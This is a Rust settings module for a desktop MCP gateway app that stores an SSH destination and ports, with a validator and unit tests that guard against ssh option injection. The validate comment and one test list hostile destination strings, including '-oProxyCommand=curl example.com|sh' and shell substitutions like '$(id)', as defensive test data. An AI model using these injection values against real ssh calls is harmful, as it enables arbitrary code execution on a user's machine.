//! Which gateway this window drives: the child this app starts, or one on another machine.
//!
//! One file, `connection.json`, in the app data directory. It holds a mode, an ssh
//! destination and two port numbers — and **no credential**, which is not an accident but
//! the whole shape of the remote design: the daemon on the far side binds loopback with no
//! access key, and SSH is the authentication. There is nothing here to protect because
//! there is nothing here worth stealing.
//!
//! ## Why a file the app owns
//!
//! `appdata.rs` creates `servers.yaml` and `gateway.env` once and never touches them again,
//! because they are the *user's* files. This one is the app's: it is written whenever
//! someone changes the connection, and it is the only file in that directory that is. It is
//! deliberately **not** in `appdata::SEEDED` either — absence is what "local mode" means, so
//! seeding a default would turn the default into a template somebody can edit into a broken
//! state, and would make "local is what you get when nothing is configured" a fact about a
//! file rather than about this code.
//!
//! ## Why a single `destination` and not a host, a user and a port
//!
//! It is an ssh destination exactly as you would type it after `ssh`: `build-box`,
//! `dave@build-box`, an alias out of `~/.ssh/config`. Everything else — the login name, a
//! non-standard sshd port, an identity file, a `ProxyJump` — belongs in `~/.ssh/config`
//! under a `Host` block whose alias goes in this field. A second place to configure SSH is a
//! second place to get SSH wrong, and every option this file accepted would be one more
//! string we hand to a program that has no `--` terminator. See `validate`.

use std::fs;
use std::io;
use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};

/// The file, in the app data directory beside `servers.yaml` and `gateway.env`.
pub const CONNECTION_FILE: &str = "connection.json";

/// The port everything defaults to: the daemon's own default (`cli.DEFAULT_PORT`), the one
/// the bridge dials (`bridge.DEFAULT_URL`), and the one the README and the banner print.
///
/// Both ends of a forward default to it, and that agreement is load-bearing rather than
/// tidy. A browser pointed at a *mismatched* forward — the remote's 8765 landing on 9000
/// here — gets the page and then a 403 on both sockets, because the remote's `Origin`
/// allowlist names the port it bound, and it cannot know what a tunnel did with it. Same
/// number at both ends keeps that trap rare. (The desktop shell is immune either way: it
/// sends no `Origin` at all.)
pub const DEFAULT_PORT: u16 = 8765;

/// The shape this build understands. A file from a newer one is refused, not guessed at.
pub const VERSION: u32 = 1;

/// Where the gateway runs.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Mode {
    /// The child this app starts, on this machine. The default, and what it has always done.
    #[default]
    Local,
    /// A daemon somebody else started on another machine, reached through an SSH forward
    /// this app opens. The app never starts, stops or restarts that daemon.
    Remote,
}

/// The connection, as stored.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase", default)]
pub struct Connection {
    pub version: u32,
    pub mode: Mode,
    /// An ssh destination, as you would type it. Empty in local mode.
    pub destination: String,
    /// The port on *this* machine.
    ///
    /// In remote mode it is the near end of the forward. In local mode it is what the child
    /// is told to bind, where `0` — the default, and what this app has always passed — means
    /// "let the OS pick". A fixed number in either mode is what lets a client on this Mac be
    /// pointed at the gateway at all: `mcp-gateway-connect --url ws://127.0.0.1:<n>/mcp` has
    /// to name a port that will still be there tomorrow, and an ephemeral one never is.
    pub local_port: u16,
    /// The port the daemon binds on the far machine. Ignored in local mode.
    pub remote_port: u16,
}

impl Default for Connection {
    fn default() -> Self {
        Self {
            version: VERSION,
            mode: Mode::Local,
            destination: String::new(),
            // Ephemeral, which is exactly what the app did before this file existed. Local
            // mode's behaviour is unchanged unless somebody asks for a fixed port.
            local_port: 0,
            remote_port: DEFAULT_PORT,
        }
    }
}

impl Connection {
    /// A remote connection with both ends on the default port.
    pub fn remote(destination: impl Into<String>) -> Self {
        Self {
            mode: Mode::Remote,
            destination: destination.into(),
            local_port: DEFAULT_PORT,
            ..Self::default()
        }
    }

    /// What to call the far machine in the window. `None` in local mode.
    pub fn label(&self) -> Option<&str> {
        match self.mode {
            Mode::Local => None,
            Mode::Remote => Some(self.destination.as_str()),
        }
    }

    /// Whether this is worth acting on, and what is wrong with it if not.
    ///
    /// **The destination check is argv-injection defence, not tidiness.** `ssh` has no `--`
    /// terminator, so there is no way to say "everything after this is a hostname". A
    /// destination of `-oProxyCommand=curl example.com|sh` is therefore arbitrary code
    /// execution *on this Mac*, from a file, with no network involved. `tunnel.rs` also puts
    /// the destination last in argv and passes every option as its own `-o` pair; this is
    /// the other half of that belt and braces, and it is the half with a test named after
    /// the attack so nobody widens the character class to be helpful.
    pub fn validate(&self) -> Result<(), String> {
        if self.version != VERSION {
            return Err(format!(
                "connection.json says version {}, and this build understands version {}",
                self.version, VERSION
            ));
        }
        if self.mode == Mode::Local {
            return Ok(());
        }
        let destination = self.destination.trim();
        if destination.is_empty() {
            return Err("remote mode needs a machine to connect to".into());
        }
        if destination.starts_with('-') {
            return Err(format!(
                "{destination:?} starts with a dash, which ssh would read as an option \
                 rather than a destination"
            ));
        }
        if !destination.chars().all(is_destination_char) {
            return Err(format!(
                "{destination:?} is not a plain ssh destination. Put anything else — a \
                 login name, a port, an identity file, a jump host — in ~/.ssh/config \
                 under a Host block, and name that block here"
            ));
        }
        if self.local_port == 0 {
            return Err("remote mode needs a fixed local port to forward to".into());
        }
        if self.remote_port == 0 {
            return Err("remote mode needs the port the daemon binds over there".into());
        }
        Ok(())
    }
}

/// What may appear in a destination: a hostname, a `user@`, an alias, a bracketed IPv6.
///
/// No space, no quote, no backslash, no shell metacharacter — see `Connection::validate`.
fn is_destination_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '@' | ':' | '[' | ']')
}

/// The settings file's path.
pub fn path(data_dir: &Path) -> PathBuf {
    data_dir.join(CONNECTION_FILE)
}

/// Read the settings, and say what went wrong rather than hiding it.
///
/// Never fails: there is always a connection to use, and it is local. But a file that is
/// there and unusable is **not** the same as no file at all, and quietly reverting to local
/// because a brace is missing is how someone spends an afternoon wondering why their remote
/// gateway stopped being remote. The second half of the pair is a sentence for the gate.
pub fn load(data_dir: &Path) -> (Connection, Option<String>) {
    let file = path(data_dir);
    let text = match fs::read_to_string(&file) {
        Ok(text) => text,
        // The ordinary case on every machine that has never opened the Connection screen.
        Err(err) if err.kind() == io::ErrorKind::NotFound => return (Connection::default(), None),
        Err(err) => {
            return (
                Connection::default(),
                Some(format!("{CONNECTION_FILE} could not be read ({err}); using local mode")),
            )
        }
    };

    let parsed: Connection = match serde_json::from_str(&text) {
        Ok(parsed) => parsed,
        Err(err) => {
            return (
                Connection::default(),
                Some(format!("{CONNECTION_FILE} is not valid JSON ({err}); using local mode")),
            )
        }
    };

    match parsed.validate() {
        Ok(()) => (parsed, None),
        Err(why) => (
            Connection::default(),
            Some(format!("{CONNECTION_FILE}: {why}. Using local mode")),
        ),
    }
}

/// Write the settings, atomically, refusing anything `load` would have to reject.
///
/// Temp file and rename in the same directory, which is the shape `portfile.write` uses on
/// the Python side and for the same reason: a half-written file is a file that reads as
/// corrupt on the next launch, and `rename` is only atomic within one filesystem.
///
/// `0600` on unix. Nothing in here is a secret — but nothing else in that directory is
/// world-readable, and a file naming a machine you log into is not the place to start.
pub fn save(data_dir: &Path, connection: &Connection) -> io::Result<()> {
    connection
        .validate()
        .map_err(|why| io::Error::new(io::ErrorKind::InvalidInput, why))?;

    let target = path(data_dir);
    let temp = target.with_extension("json.tmp");
    let mut text = serde_json::to_string_pretty(connection)
        .map_err(|err| io::Error::new(io::ErrorKind::InvalidData, err))?;
    text.push('\n');

    fs::create_dir_all(data_dir)?;
    fs::write(&temp, text)?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(&temp, fs::Permissions::from_mode(0o600))?;
    }
    fs::rename(&temp, &target)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn scratch() -> PathBuf {
        let dir = std::env::temp_dir().join(format!(
            "mcp-gateway-settings-{}-{:?}",
            std::process::id(),
            std::thread::current().id()
        ));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).expect("a scratch directory");
        dir
    }

    #[test]
    fn no_settings_file_means_local_mode_and_says_nothing_about_it() {
        let dir = scratch();
        let (connection, complaint) = load(&dir);
        assert_eq!(connection, Connection::default());
        assert_eq!(connection.mode, Mode::Local);
        // Nothing is wrong. Every machine that has never opened the Connection screen is
        // here, and a warning on that path would be a warning nobody can act on.
        assert_eq!(complaint, None);
    }

    #[test]
    fn the_default_local_port_is_ephemeral_exactly_as_it_was_before_this_file() {
        assert_eq!(Connection::default().local_port, 0);
    }

    #[test]
    fn the_default_port_is_the_one_the_bridge_dials() {
        // Twinned with `DEFAULT_PORT` in `src/mcp_gateway/cli.py` and `DEFAULT_URL` in
        // `src/mcp_gateway/bridge.py`. If that number ever moves, this is one of the places
        // that has to move with it -- and the Connection screen prints a `claude mcp add`
        // line built from it, so a drift here is a line that connects to nothing.
        assert_eq!(DEFAULT_PORT, 8765);
        assert_eq!(Connection::remote("build-box").local_port, 8765);
        assert_eq!(Connection::remote("build-box").remote_port, 8765);
    }

    #[test]
    fn settings_round_trip_through_the_file_and_leave_no_temp_behind() {
        let dir = scratch();
        let mut written = Connection::remote("dave@build-box");
        written.local_port = 9000;
        save(&dir, &written).expect("the settings are written");

        let (read_back, complaint) = load(&dir);
        assert_eq!(read_back, written);
        assert_eq!(complaint, None);
        assert!(!dir.join("connection.json.tmp").exists(), "the temp file is renamed away");
    }

    #[test]
    fn a_corrupt_settings_file_falls_back_to_local_and_explains_itself() {
        let dir = scratch();
        fs::write(path(&dir), "{ this is not json").expect("a broken file");
        let (connection, complaint) = load(&dir);
        assert_eq!(connection.mode, Mode::Local);
        // The sentence is the point. A silent revert to local is how somebody spends an
        // afternoon wondering why their remote gateway stopped being remote.
        let complaint = complaint.expect("a reason");
        assert!(complaint.contains("connection.json"), "{complaint}");
        assert!(complaint.contains("local mode"), "{complaint}");
    }

    #[test]
    fn a_file_from_a_later_build_is_refused_rather_than_guessed_at() {
        let dir = scratch();
        fs::write(path(&dir), r#"{"version": 99, "mode": "remote"}"#).expect("a future file");
        let (connection, complaint) = load(&dir);
        assert_eq!(connection.mode, Mode::Local);
        assert!(complaint.expect("a reason").contains("version"));
    }

    #[test]
    fn remote_mode_without_a_destination_is_refused() {
        let mut connection = Connection::remote("");
        assert!(connection.validate().is_err());
        connection.destination = "   ".into();
        assert!(connection.validate().is_err());
    }

    #[test]
    fn remote_mode_needs_both_ends_of_the_forward() {
        let mut connection = Connection::remote("build-box");
        connection.local_port = 0;
        assert!(connection.validate().is_err(), "a forward needs a near end");
        connection.local_port = 8765;
        connection.remote_port = 0;
        assert!(connection.validate().is_err(), "and a far end");
    }

    #[test]
    fn a_destination_that_could_be_an_ssh_option_is_refused() {
        // `ssh` has no `--`, so a destination that starts with a dash is an option and a
        // destination with a space in it is several. `-oProxyCommand=…` is the whole attack:
        // a config file in the app's own data directory becomes code execution on this Mac.
        //
        // If this test ever fails because someone widened the character class to be helpful,
        // the fix is not to widen it further. It is `~/.ssh/config`.
        for hostile in [
            "-oProxyCommand=curl example.com|sh",
            "--",
            "-D1080",
            "build-box -oProxyCommand=sh",
            "build box",
            "build-box;id",
            "$(id)",
            "`id`",
            "build-box\nProxyCommand id",
            "build-box'",
        ] {
            let connection = Connection::remote(hostile);
            assert!(
                connection.validate().is_err(),
                "{hostile:?} must not reach ssh's argv"
            );
        }
    }

    #[test]
    fn the_destinations_people_actually_type_are_accepted() {
        for good in [
            "build-box",
            "dave@build-box",
            "build-box.local",
            "gw",
            "dave@192.168.1.10",
            "dave@[fe80::1]",
        ] {
            let connection = Connection::remote(good);
            assert_eq!(connection.validate(), Ok(()), "{good:?} is an ssh destination");
        }
    }

    #[test]
    fn local_mode_needs_nothing_at_all() {
        // The point of the default: an app that has never been configured is valid.
        assert_eq!(Connection::default().validate(), Ok(()));
    }

    #[test]
    fn a_connection_carries_no_credential() {
        // Remote mode's entire authentication story is SSH, so there is no field here to
        // hold a secret -- and this is the test that fails if somebody adds one.
        let json = serde_json::to_string(&Connection::remote("dave@build-box")).unwrap();
        for forbidden in ["key", "pass", "secret", "token", "credential"] {
            assert!(
                !json.to_lowercase().contains(forbidden),
                "{json} mentions {forbidden}"
            );
        }
    }

    #[test]
    fn only_a_remote_connection_names_a_machine() {
        assert_eq!(Connection::default().label(), None);
        assert_eq!(Connection::remote("build-box").label(), Some("build-box"));
    }
}
